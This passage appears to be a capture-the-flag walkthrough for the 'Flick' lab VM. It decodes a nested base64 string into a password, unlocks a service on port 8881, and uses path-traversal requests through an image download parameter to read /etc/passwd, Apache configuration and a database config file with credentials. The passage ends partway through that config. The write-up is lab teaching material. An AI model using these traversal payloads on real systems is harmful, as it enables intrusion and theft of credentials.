\x62\x47\x45\x7a\x51\x6b\x6c\x57\x62\x58\x42\x48\x56\x44\x4a\x53\x56\x31\x5a\x75
\x55\x6d\x68\x53\x61\x7a\x56\x7a\x57\x57\x78\x6f\x62\x31\x64\x47\x57\x6e\x52\x4e
\x53\x47\x68\x50\x55\x6d\x31\x34\x56\x31\x52\x56\x61\x47\x39\x58\x52\x30\x70\x79
\x54\x6c\x5a\x73\x57\x6d\x4a\x47\x57\x6d\x68\x5a\x4d\x6e\x68\x58\x59\x7a\x46\x57
\x63\x6c\x70\x47\x61\x47\x6c\x53\x4d\x31\x46\x36\x56\x6a\x4a\x30\x55\x31\x55\x78
\x57\x6e\x4a\x4e\x57\x45\x70\x71\x55\x6d\x31\x6f\x56\x31\x52\x58\x4e\x56\x4e\x4e
\x4d\x56\x70\x78\x55\x32\x74\x30\x56\x31\x5a\x72\x63\x46\x70\x58\x61\x31\x70\x33
\x56\x6a\x46\x4b\x56\x32\x4e\x49\x62\x46\x64\x57\x52\x55\x70\x6f\x56\x6b\x52\x4b
\x54\x32\x52\x47\x53\x6e\x4a\x61\x52\x6d\x68\x70\x56\x6a\x4e\x6f\x56\x56\x64\x57
\x55\x6b\x39\x52\x4d\x57\x52\x48\x56\x32\x35\x53\x54\x6c\x5a\x46\x53\x6c\x68\x55
\x56\x33\x68\x48\x54\x6c\x5a\x61\x57\x45\x35\x56\x4f\x56\x68\x53\x4d\x48\x42\x4a
\x56\x6c\x64\x34\x63\x31\x64\x74\x53\x6b\x68\x68\x52\x6c\x4a\x58\x54\x55\x5a\x77
\x56\x46\x5a\x71\x52\x6e\x64\x53\x4d\x56\x4a\x30\x5a\x55\x64\x73\x55\x32\x4a\x59
\x59\x33\x68\x57\x61\x31\x70\x68\x56\x54\x46\x56\x65\x46\x64\x75\x53\x6b\x35\x58
\x52\x58\x42\x78\x56\x57\x78\x6b\x4e\x47\x46\x47\x56\x58\x64\x68\x52\x55\x35\x55
\x55\x6d\x78\x77\x65\x46\x55\x79\x64\x47\x46\x69\x52\x6c\x70\x7a\x56\x32\x78\x77
\x57\x47\x45\x78\x63\x44\x4e\x5a\x61\x32\x52\x47\x5a\x57\x78\x47\x63\x6d\x4a\x47
\x5a\x46\x64\x4e\x4d\x45\x70\x4a\x56\x6d\x74\x53\x53\x31\x55\x78\x57\x58\x68\x57
\x62\x6c\x5a\x57\x59\x6c\x68\x43\x56\x46\x6c\x72\x56\x6e\x64\x57\x56\x6c\x70\x30
\x5a\x55\x63\x35\x55\x6b\x31\x58\x55\x6e\x70\x57\x4d\x6a\x56\x4c\x56\x30\x64\x4b
\x53\x46\x56\x74\x4f\x56\x56\x57\x62\x48\x42\x59\x56\x47\x78\x61\x59\x56\x64\x48
\x56\x6b\x68\x6b\x52\x32\x68\x70\x55\x6c\x68\x42\x64\x31\x64\x57\x56\x6d\x39\x55
\x4d\x56\x70\x30\x55\x6d\x35\x4b\x54\x31\x5a\x73\x53\x6c\x68\x55\x56\x6c\x70\x33
\x56\x30\x5a\x72\x65\x46\x64\x72\x64\x47\x70\x69\x56\x6b\x70\x49\x56\x6c\x64\x34
\x61\x32\x46\x57\x53\x6e\x52\x50\x56\x45\x35\x58\x54\x57\x35\x6f\x57\x46\x6c\x71
\x53\x6b\x5a\x6c\x52\x6d\x52\x5a\x57\x6b\x55\x31\x56\x31\x5a\x73\x63\x46\x56\x58
\x56\x33\x52\x72\x56\x54\x46\x73\x56\x31\x56\x73\x57\x6c\x68\x69\x56\x56\x70\x7a
\x57\x57\x74\x61\x64\x32\x56\x47\x56\x58\x6c\x6b\x52\x45\x4a\x58\x54\x56\x5a\x77
\x65\x56\x59\x79\x65\x48\x64\x58\x62\x46\x70\x58\x59\x30\x68\x4b\x56\x31\x5a\x46
\x57\x6b\x78\x57\x4d\x56\x70\x48\x59\x32\x31\x4b\x52\x31\x70\x47\x5a\x45\x35\x4e
\x52\x58\x42\x4b\x56\x6d\x31\x30\x55\x31\x4d\x78\x56\x58\x68\x58\x57\x47\x68\x68
\x55\x30\x5a\x61\x56\x6c\x6c\x72\x57\x6b\x74\x6a\x52\x6c\x70\x78\x56\x47\x30\x35
\x56\x31\x5a\x73\x63\x45\x68\x58\x56\x45\x35\x76\x59\x56\x55\x78\x57\x46\x56\x75
\x63\x46\x64\x4e\x56\x32\x68\x32\x56\x31\x5a\x61\x53\x31\x49\x78\x54\x6e\x56\x52
\x62\x46\x5a\x58\x54\x54\x46\x4b\x4e\x6c\x5a\x48\x64\x47\x46\x68\x4d\x6b\x35\x7a
\x56\x32\x35\x53\x61\x31\x4a\x74\x55\x6e\x42\x57\x62\x47\x68\x44\x54\x6c\x5a\x6b
\x56\x56\x46\x74\x52\x6d\x70\x4e\x56\x31\x49\x77\x56\x54\x4a\x30\x61\x31\x64\x48
\x53\x6c\x68\x68\x52\x30\x5a\x56\x56\x6d\x78\x77\x4d\x31\x70\x58\x65\x48\x4a\x6c
\x56\x31\x5a\x49\x5a\x45\x64\x30\x55\x32\x45\x7a\x51\x58\x64\x58\x62\x46\x5a\x68
\x59\x54\x4a\x47\x56\x31\x64\x75\x53\x6d\x6c\x6c\x61\x31\x70\x59\x57\x57\x78\x6f
\x51\x31\x52\x47\x55\x6e\x4a\x58\x62\x45\x70\x73\x55\x6d\x31\x53\x65\x6c\x6c\x56
\x57\x6c\x4e\x68\x56\x6b\x70\x31\x55\x57\x78\x77\x56\x32\x4a\x59\x55\x6c\x68\x61
\x52\x45\x5a\x72\x55\x6a\x4a\x4b\x53\x56\x52\x74\x61\x46\x4e\x57\x56\x46\x5a\x61
\x56\x6c\x63\x78\x4e\x47\x51\x79\x56\x6b\x64\x57\x62\x6c\x4a\x72\x55\x6b\x56\x4b
\x62\x31\x6c\x59\x63\x45\x64\x6c\x56\x6c\x4a\x7a\x56\x6d\x35\x4f\x57\x47\x4a\x47
\x63\x46\x68\x5a\x4d\x47\x68\x4c\x56\x32\x78\x61\x57\x46\x56\x72\x5a\x47\x46\x57
\x56\x31\x4a\x51\x56\x54\x42\x6b\x52\x31\x49\x79\x52\x6b\x68\x69\x52\x6b\x35\x70
\x59\x54\x42\x77\x4d\x6c\x5a\x74\x4d\x54\x42\x56\x4d\x55\x31\x34\x56\x56\x68\x73
\x56\x56\x64\x48\x65\x46\x5a\x5a\x56\x45\x5a\x33\x59\x55\x5a\x57\x63\x56\x4e\x74
\x4f\x56\x64\x53\x62\x45\x70\x5a\x56\x47\x78\x6a\x4e\x57\x45\x79\x53\x6b\x64\x6a
\x52\x57\x68\x58\x59\x6c\x52\x42\x4d\x56\x5a\x58\x63\x33\x68\x58\x52\x6c\x5a\x7a
\x59\x55\x5a\x6b\x54\x6c\x59\x79\x61\x44\x4a\x57\x61\x6b\x4a\x72\x55\x7a\x46\x6b
\x56\x31\x5a\x75\x53\x6c\x42\x57\x62\x48\x42\x76\x57\x56\x52\x47\x64\x31\x4e\x57
\x57\x6b\x68\x6c\x52\x30\x5a\x61\x56\x6d\x31\x53\x52\x31\x52\x73\x57\x6d\x46\x56
\x52\x6c\x6c\x35\x59\x55\x5a\x6f\x57\x6c\x64\x49\x51\x6c\x68\x56\x4d\x46\x70\x68
\x59\x31\x5a\x4f\x63\x56\x56\x73\x57\x6b\x35\x57\x4d\x55\x6c\x33\x56\x6c\x52\x4b
\x4d\x47\x49\x79\x52\x6b\x64\x54\x62\x6b\x35\x55\x59\x6b\x64\x6f\x56\x6c\x5a\x73
\x57\x6e\x64\x4e\x4d\x56\x70\x79\x56\x32\x31\x47\x61\x6c\x5a\x72\x63\x44\x42\x61
\x52\x57\x51\x77\x56\x6a\x4a\x4b\x63\x6c\x4e\x72\x61\x46\x64\x53\x4d\x32\x68\x6f
\x56\x6b\x52\x4b\x52\x31\x59\x78\x54\x6e\x56\x56\x62\x45\x4a\x58\x55\x6c\x52\x57
\x57\x56\x64\x57\x55\x6b\x64\x6b\x4d\x6b\x5a\x48\x56\x32\x78\x57\x55\x32\x45\x78
\x63\x48\x4e\x56\x62\x54\x46\x54\x5a\x57\x78\x73\x56\x6c\x64\x73\x54\x6d\x68\x53
\x56\x45\x5a\x61\x56\x56\x63\x31\x62\x31\x59\x78\x57\x58\x70\x68\x53\x45\x70\x61
\x59\x57\x74\x61\x63\x6c\x56\x71\x52\x6c\x64\x6a\x4d\x6b\x5a\x47\x54\x31\x5a\x6b
\x56\x31\x5a\x47\x57\x6d\x46\x57\x62\x47\x4e\x34\x54\x6b\x64\x52\x65\x56\x5a\x72
\x5a\x46\x64\x69\x62\x45\x70\x79\x56\x57\x74\x57\x53\x32\x49\x78\x62\x46\x6c\x6a
\x52\x57\x52\x73\x56\x6d\x78\x4b\x65\x6c\x5a\x74\x4d\x44\x56\x58\x52\x30\x70\x48
\x59\x30\x5a\x6f\x57\x6b\x31\x48\x61\x45\x78\x57\x4d\x6e\x68\x68\x56\x30\x5a\x57
\x63\x6c\x70\x48\x52\x6c\x64\x4e\x4d\x6d\x68\x4a\x56\x31\x52\x4a\x65\x46\x4d\x78
\x53\x58\x68\x6a\x52\x57\x52\x68\x55\x6d\x73\x31\x57\x46\x59\x77\x56\x6b\x74\x4e
\x62\x46\x70\x30\x59\x30\x56\x6b\x57\x6c\x59\x77\x56\x6a\x52\x57\x62\x47\x68\x76
\x56\x30\x5a\x6b\x53\x47\x46\x47\x57\x6c\x70\x69\x57\x47\x68\x6f\x56\x6d\x31\x34
\x63\x32\x4e\x73\x5a\x48\x4a\x6b\x52\x33\x42\x54\x59\x6b\x5a\x77\x4e\x46\x5a\x58
\x4d\x54\x42\x4e\x52\x6c\x6c\x34\x56\x32\x35\x4f\x61\x6c\x4a\x58\x61\x46\x68\x57
\x61\x6b\x35\x54\x56\x45\x5a\x73\x56\x56\x46\x59\x61\x46\x4e\x57\x61\x33\x42\x36
\x56\x6b\x64\x34\x59\x56\x55\x79\x53\x6b\x5a\x58\x57\x48\x42\x58\x56\x6c\x5a\x77
\x52\x31\x51\x78\x57\x6b\x4e\x56\x62\x45\x4a\x56\x54\x55\x51\x77\x50\x51\x3d\x3d

 .o88o. oooo   o8o            oooo        
 888 `&amp;quot; `888   `&amp;quot;&amp;#39;            `888        
o888oo   888  oooo   .ooooo.   888  oooo  
 888     888  `888  d88&amp;#39; `&amp;quot;Y8  888 .8P&amp;#39;   
 888     888   888  888        888888.    
 888     888   888  888   .o8  888 `88b.  
o888o   o888o o888o `Y8bod8P&amp;#39; o888o o888o 


debug1: Authentications that can continue: publickey,password
debug1: Next authentication method: publickey
debug1: Trying private key: /home/notfound/.ssh/id_rsa
debug1: Trying private key: /home/notfound/.ssh/id_dsa
debug1: Trying private key: /home/notfound/.ssh/id_ecdsa
debug1: Trying private key: /home/notfound/.ssh/id_ed25519
debug1: Next authentication method: password
root@192.168.10.42&amp;#39;s password: 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;decode hex string, we can get this:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;Vm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSWFJteFZVMjA1VjAxV2JETlhhMk0xVmpKS1IySkVUbGhoTVhCUVZteFZlRll5VGtsalJtaG9UVmhDVVZacVFtRlpWMDE1VTJ0V1ZXSkhhRzlVVmxaM1ZsWmFkR05GWkZSTmF6RTFWVEowVjFaWFNraGhSemxWVmpOT00xcFZXbUZrUjA1R1drWndWMDFFUlRGV1ZFb3dWakZhV0ZOcmFHaFNlbXhXVm0xNFlVMHhXbk5YYlVaclVqQTFSMWRyV2xOVWJVcEdZMFZ3VjJKVVJYZFpla3BIVmpGT2RWVnRhRk5sYlhoWFZtMXdUMVF3TUhoalJscFlZbFZhY2xWcVFURlNNVlY1VFZSU1ZrMXJjRmhWTW5SM1ZqSktWVkpZWkZwbGEzQklWbXBHVDJSV1ZuUmhSazVzWWxob1dGWnRNSGhPUm14V1RVaG9XR0pyTlZsWmJGWmhZMnhXYzFWclpGaGlSM1F6VjJ0U1UxWnJNWEpqUm1oV1RXNVNNMVpxU2t0V1ZrcFpXa1p3VjFKV2NIbFdWRUpoVkRKT2RGSnJaRmhpVjNoVVdWUk9RMWRHV25STlZFSlhUV3hHTlZaWE5VOVhSMHBJVld4c1dtSkhhRlJXTUZwVFZqRndSMVJ0ZUdsU2JYY3hWa1phVTFVeFduSk5XRXBxVWxkNGFGVXdhRU5UUmxweFUydGFiRlpzV2xwWGExcDNZa2RGZWxGcmJGZFdNMEpJVmtSS1UxWXhWblZWYlhCVFlrVndWVlp0ZUc5Uk1XUnpWMjVLV0dKSFVtOVVWbHBYVGxaYVdHVkhkR2hpUlhBd1dWVm9UMVp0Um5KT1ZsSlhUVlp3V0ZreFdrdGpiVkpIVld4a2FWSnRPVE5XTW5oWFlqSkZlRmRZWkU1V1ZscFVXV3RrVTFsV1VsWlhiVVpzWWtad2VGVXlkREJXTVZweVYyeHdXbFpXY0hKV1ZFWkxWMVpHY21KR1pGZE5NRXBKVm10U1MxVXhXWGhhU0ZaVllrWktjRlpxVG05V1ZscEhXVE5vYVUxWFVucFdNV2h2V1ZaS1IxTnVRbFZXTTFKNlZHdGFhMk5zV25Sa1JtUnBWbGhDTlZkVVFtRmpNV1IwVTJ0a1dHSlhhR0ZVVmxwM1pXeHJlV1ZIZEd0U2EzQXdXbFZhYTJGV1duSmlla1pYWWxoQ1RGUnJXbEpsUm1SellVWlNhVkp1UWxwV2JYUlhaREZrUjJKSVRtaFNWVFZaVlcxNGQyVkdWblJrUkVKb1lYcEdlVlJzVm5OWGJGcFhZMGhLV2xaWFVrZGFWV1JQVTBkR1IyRkhiRk5pYTBwMlZtMTBVMU14VVhsVVdHeFZZVEZ3YUZWcVNtOVdSbEpZVGxjNWEySkdjRWhXYlRBMVZXc3hXRlZzYUZkTlYyaDJWakJrUzFkV1ZuSlBWbHBvWVRGd1NWWkhlR0ZaVm1SR1RsWmFVRll5YUZoWldIQlhVMFphY1ZOcVVsWk5WMUl3VlRKMGIyRkdTbk5UYkdoVlZsWndNMVpyV21GalZrcDBaRWQwVjJKclNraFdSM2hoVkRKR1YxTnVVbEJXUlRWWVdWUkdkMkZHV2xWU2ExcHNVbTFTZWxsVldsTmhSVEZaVVc1b1YxWXphSEpaYWtaclVqRldjMkZGT1ZkV1ZGWmFWbGN4TkdReVZrZFdibEpyVWtWS2IxbFljRWRsVmxKelZtMDVXR0pHY0ZoWk1HaExWMnhhV0ZWclpHRldNMmhJV1RJeFMxSXhjRWRhUms1WFYwVktNbFp0Y0VkWlYwVjRWbGhvV0ZkSGFGWlpiWGhoVm14c2NsZHJkR3BTYkZwNFZXMTBNRll4V25OalJXaFhWak5TVEZsVVFYaFNWa3B6Vkd4YVUySkZXWHBXVlZwR1QxWkNVbEJVTUQwPQ==
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;we guesse that the string is encoded by base64. So we create py script to decode it.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;#!/usr/bin/env python2
# -*- coding: utf8 -*-

import base64


def decode(data):
    n = 0
    while True:
        try:
            data = base64.b64decode(data)
        except TypeError:
            n = n - 1
            break
        else:
            n = n + 1

    data = base64.b64encode(data)
    return n, data


if __name__ == &amp;quot;__main__&amp;quot;:
    enc_str = &amp;quot;Vm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSWFJteFZVMjA1VjAxV2JETlhhMk0xVmpKS1IySkVUbGhoTVhCUVZteFZlRll5VGtsalJtaG9UVmhDVVZacVFtRlpWMDE1VTJ0V1ZXSkhhRzlVVmxaM1ZsWmFkR05GWkZSTmF6RTFWVEowVjFaWFNraGhSemxWVmpOT00xcFZXbUZrUjA1R1drWndWMDFFUlRGV1ZFb3dWakZhV0ZOcmFHaFNlbXhXVm0xNFlVMHhXbk5YYlVaclVqQTFSMWRyV2xOVWJVcEdZMFZ3VjJKVVJYZFpla3BIVmpGT2RWVnRhRk5sYlhoWFZtMXdUMVF3TUhoalJscFlZbFZhY2xWcVFURlNNVlY1VFZSU1ZrMXJjRmhWTW5SM1ZqSktWVkpZWkZwbGEzQklWbXBHVDJSV1ZuUmhSazVzWWxob1dGWnRNSGhPUm14V1RVaG9XR0pyTlZsWmJGWmhZMnhXYzFWclpGaGlSM1F6VjJ0U1UxWnJNWEpqUm1oV1RXNVNNMVpxU2t0V1ZrcFpXa1p3VjFKV2NIbFdWRUpoVkRKT2RGSnJaRmhpVjNoVVdWUk9RMWRHV25STlZFSlhUV3hHTlZaWE5VOVhSMHBJVld4c1dtSkhhRlJXTUZwVFZqRndSMVJ0ZUdsU2JYY3hWa1phVTFVeFduSk5XRXBxVWxkNGFGVXdhRU5UUmxweFUydGFiRlpzV2xwWGExcDNZa2RGZWxGcmJGZFdNMEpJVmtSS1UxWXhWblZWYlhCVFlrVndWVlp0ZUc5Uk1XUnpWMjVLV0dKSFVtOVVWbHBYVGxaYVdHVkhkR2hpUlhBd1dWVm9UMVp0Um5KT1ZsSlhUVlp3V0ZreFdrdGpiVkpIVld4a2FWSnRPVE5XTW5oWFlqSkZlRmRZWkU1V1ZscFVXV3RrVTFsV1VsWlhiVVpzWWtad2VGVXlkREJXTVZweVYyeHdXbFpXY0hKV1ZFWkxWMVpHY21KR1pGZE5NRXBKVm10U1MxVXhXWGhhU0ZaVllrWktjRlpxVG05V1ZscEhXVE5vYVUxWFVucFdNV2h2V1ZaS1IxTnVRbFZXTTFKNlZHdGFhMk5zV25Sa1JtUnBWbGhDTlZkVVFtRmpNV1IwVTJ0a1dHSlhhR0ZVVmxwM1pXeHJlV1ZIZEd0U2EzQXdXbFZhYTJGV1duSmlla1pYWWxoQ1RGUnJXbEpsUm1SellVWlNhVkp1UWxwV2JYUlhaREZrUjJKSVRtaFNWVFZaVlcxNGQyVkdWblJrUkVKb1lYcEdlVlJzVm5OWGJGcFhZMGhLV2xaWFVrZGFWV1JQVTBkR1IyRkhiRk5pYTBwMlZtMTBVMU14VVhsVVdHeFZZVEZ3YUZWcVNtOVdSbEpZVGxjNWEySkdjRWhXYlRBMVZXc3hXRlZzYUZkTlYyaDJWakJrUzFkV1ZuSlBWbHBvWVRGd1NWWkhlR0ZaVm1SR1RsWmFVRll5YUZoWldIQlhVMFphY1ZOcVVsWk5WMUl3VlRKMGIyRkdTbk5UYkdoVlZsWndNMVpyV21GalZrcDBaRWQwVjJKclNraFdSM2hoVkRKR1YxTnVVbEJXUlRWWVdWUkdkMkZHV2xWU2ExcHNVbTFTZWxsVldsTmhSVEZaVVc1b1YxWXphSEpaYWtaclVqRldjMkZGT1ZkV1ZGWmFWbGN4TkdReVZrZFdibEpyVWtWS2IxbFljRWRsVmxKelZtMDVXR0pHY0ZoWk1HaExWMnhhV0ZWclpHRldNMmhJV1RJeFMxSXhjRWRhUms1WFYwVktNbFp0Y0VkWlYwVjRWbGhvV0ZkSGFGWlpiWGhoVm14c2NsZHJkR3BTYkZwNFZXMTBNRll4V25OalJXaFhWak5TVEZsVVFYaFNWa3B6Vkd4YVUySkZXWHBXVlZwR1QxWkNVbEJVTUQwPQ==&amp;quot;
    print &amp;quot;[+] decode %d times: %s&amp;quot; % decode(enc_str)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;run the command as follow:  &lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;lab:flick/ $ python decode.py 
[+] decode 16 times: tabupJievas8Knoj
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;try to login ssh with password &amp;ldquo;&lt;strong&gt;tabupJievas8Knoj&lt;/strong&gt;&amp;rdquo;,  &lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;root@192.168.10.42&amp;#39;s password: 
Permission denied, please try again.
root@192.168.10.42&amp;#39;s password: 
Permission denied, please try again.
root@192.168.10.42&amp;#39;s password: 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;Port: 8881&lt;/h3&gt;

&lt;p&gt;connect to port 8881 with ncat,  &lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;lab:pentestlab/ $ ncat -v 192.168.10.42 8881
Ncat: Version 6.47 ( http://nmap.org/ncat )
Ncat: Connected to 192.168.10.42:8881.
Welcome to the admin server. A correct password will &amp;#39;flick&amp;#39; the switch and open a new door:
&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;try to input different length string as follow:  &lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;&amp;gt; Ncat: 2 bytes sent, 104 bytes received in 0.03 seconds.
lab:pentestlab/ $ python2 -c &amp;#39;print &amp;quot;A&amp;quot;&amp;#39; | ncat 192.168.10.42 8881
Welcome to the admin server. A correct password will &amp;#39;flick&amp;#39; the switch and open a new door:
&amp;gt; OK: A

&amp;gt; lab:pentestlab/ $ python2 -c &amp;#39;print &amp;quot;A&amp;quot; * 2&amp;#39; | ncat 192.168.10.42 8881
Welcome to the admin server. A correct password will &amp;#39;flick&amp;#39; the switch and open a new door:
&amp;gt; OK: AA

&amp;gt; lab:pentestlab/ $ python2 -c &amp;#39;print &amp;quot;A&amp;quot; * 20&amp;#39; | ncat 192.168.10.42 8881
Welcome to the admin server. A correct password will &amp;#39;flick&amp;#39; the switch and open a new door:
&amp;gt; OK: AAAAAAAAAAAAAAAAAAAA

&amp;gt; lab:pentestlab/ $ python2 -c &amp;#39;print &amp;quot;A&amp;quot; * 2000&amp;#39; | ncat 192.168.10.42 8881
Welcome to the admin server. A correct password will &amp;#39;flick&amp;#39; the switch and open a new door:
&amp;gt
&amp;gt
......
......
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;we find server will split string with buffer size 1024. Now, we can&amp;rsquo;t exploit server with large strings.&lt;br&gt;
And we login with the string &amp;lsquo;tabupJievas8Knoj&amp;rsquo; from port 22.  &lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;lab:pentestlab/ $ python2 -c &amp;#39;print &amp;quot;tabupJievas8Knoj&amp;quot;&amp;#39; | ncat -v 192.168.10.42 8881
Ncat: Version 6.47 ( http://nmap.org/ncat )
Ncat: Connected to 192.168.10.42:8881.
Welcome to the admin server. A correct password will &amp;#39;flick&amp;#39; the switch and open a new door:
&amp;gt; OK: tabupJievas8Knoj

Accepted! The door should be open now :poolparty:

&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;scan open port(s) again.  &lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;lab:pentestlab/ $ nmap -v -n -T4 -p- 192.168.10.42 

Starting Nmap 6.47 ( http://nmap.org ) at 2015-07-20 15:34 UTC
Initiating Ping Scan at 15:34
Scanning 192.168.10.42 [2 ports]
Completed Ping Scan at 15:34, 0.00s elapsed (1 total hosts)
Initiating Connect Scan at 15:34
Scanning 192.168.10.42 [65535 ports]
Discovered open port 22/tcp on 192.168.10.42
Discovered open port 80/tcp on 192.168.10.42
Discovered open port 8881/tcp on 192.168.10.42
Completed Connect Scan at 15:34, 1.77s elapsed (65535 total ports)
Nmap scan report for 192.168.10.42
Host is up (0.0072s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8881/tcp open  unknown

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.86 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;Port: 80&lt;/h3&gt;

&lt;p&gt;access to http://192.168.10.42/404, we can get:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;http://192.168.10.42/db/  
http://192.168.10.42/scripts/  
http://192.168.10.42/web/  
http://192.168.10.42/icons/  
http://192.168.10.42/cgi-bin/  
http://192.168.10.42/image/view  
http://192.168.10.42/image/download  
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;You have to be logged in to download photos.  &lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;http://192.168.10.42/image/download?filename=....//....//etc/passwd  
http://192.168.10.42/image/download?filename=....//....//....//....//etc/apache2/sites-enabled/000-default  
http://192.168.10.42/image/download?filename=....//....//....//....//var/www/flick_photos/public/index.php
http://192.168.10.42/image/download?filename=....//....//....//....//var/www/flick_photos/bootstrap/autoload.php
http://192.168.10.42/image/download?filename=....//....//....//....//var/www/flick_photos/vendor/autoload.php
http://192.168.10.42/image/download?filename=....//....//....//....//var/www/flick_photos/vendor/composer/ClassLoader.php
http://192.168.10.42/image/download?filename=....//....//....//....//var/www/flick_photos/app/config/database.php
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;view &lt;strong&gt;/etc/apache2/sites-enabled/000-default&lt;/strong&gt;, we can get:  &lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;    DocumentRoot /var/www/flick_photos/public
    &amp;lt;Directory /&amp;gt;
        Options FollowSymLinks
        AllowOverride None
    &amp;lt;/Directory&amp;gt;
    &amp;lt;Directory /var/www/flick_photos/public&amp;gt;
        Options Indexes FollowSymLinks MultiViews
        AllowOverride All
        Order allow,deny
        allow from all
    &amp;lt;/Directory&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;view &lt;strong&gt;/etc/passwd&lt;/strong&gt;, we can get:   &lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:105::/var/run/dbus:/bin/false
whoopsie:x:103:106::/nonexistent:/bin/false
landscape:x:104:109::/var/lib/landscape:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
robin:x:1000:1000:robin,,,:/home/robin:/bin/bash
mysql:x:106:114:MySQL Server,,,:/nonexistent:/bin/false
dean:x:1001:1001:,,,:/home/dean:/bin/bash
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;view &lt;strong&gt;/var/www/flick_photos/app/config/database.php&lt;/strong&gt;, we can get:  &lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;    &amp;#39;connections&amp;#39; =&amp;gt; array(

        &amp;#39;sqlite&amp;#39; =&amp;gt; array(
            &amp;#39;driver&amp;#39;   =&amp;gt; &amp;#39;sqlite&amp;#39;,
            &amp;#39;database&amp;#39; =&amp;gt; __DIR__.&amp;#39;/../database/production.sqlite&amp;#39;, // OLD DATABASE NO LONGER IN USE!
            &amp;#39;prefix&amp;#39;   =&amp;gt; &amp;#39;&amp;#39;,
        ), 

        &amp;#39;mysql&amp;#39; =&amp;gt; array(
            &amp;#39;driver&amp;#39;    =&amp;gt; &amp;#39;mysql&amp;#39;,
            &amp;#39;host&amp;#39;      =&amp;gt; &amp;#39;localhost&amp;#39;,
            &amp;#39;database&amp;#39;  =&amp;gt; &amp;#39;flick&amp;#39;,
            &amp;#39;username&amp;#39;  =&amp;gt; &amp;#39;flick&amp;#39;,
            &amp;#39;password&amp;#39;  =&amp;gt; &amp;#39;resuddecNeydmar3&amp;#39;,
            &amp;#39;charset&amp;#39;   =&amp;gt; &amp;#39;utf8&amp;#39;,
            &amp;#39;collation&amp;#39; =&amp;gt; &amp;#39;utf8_unicode_ci&amp;#39;,
            &amp;#39;prefix&amp;#39;    =&amp;gt; &amp;#39;&amp;#39;,
        ), 

        &amp;#39;pgsql&amp;#39; =&amp;gt; array(
            &amp;#39;driver&amp;#39;   =&amp;gt; &amp;#39;pgsql&amp;#39;,
